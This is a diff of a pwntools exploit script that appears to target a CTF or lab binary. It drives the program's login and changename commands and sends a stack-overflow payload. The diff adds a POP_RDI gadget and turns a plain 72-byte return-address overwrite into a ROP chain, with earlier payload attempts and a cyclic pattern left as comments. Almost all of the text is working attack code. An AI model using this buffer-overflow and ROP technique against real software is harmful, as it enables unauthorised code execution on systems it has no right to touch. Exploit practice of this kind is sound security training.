@@ -16,6 +16,8 @@ break func.c:191
 continue
 ''')
 
+POP_RDI = 0x155554c34205
+
 print(p.recvuntil(b"cmd> ")) # username
 p.sendline(b"login")
 # # test user
@@ -32,7 +34,11 @@ p.sendline(b"changename")
 #payload=b"\x66\xb9\x09\x17\x1c\x56\x00\x00"*300
 #payload=cyclic(300)
 #payload=b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf"
-payload=b"\x41"*72 + p64(0x4045ca)
+# payload=b"\x41"*72 + p64(0x4045ca)
+# payload=b"\x41"*72 + p64(0x4040e4) + p64(0x40343d) +  p64(0x4034c9)
+# payload = b"\x41"*72 + p64(0x403866)
+# payload=b"\x41"*72 + p64(0x4040e4) + p64(0x403778) +  p64(0x4051da)
+payload=b"\x41"*72 + p64(0x4040e4) + p64(POP_RDI) + p64(0x4051da) + p64(0x403778) 
 
 
 p.sendline(payload)
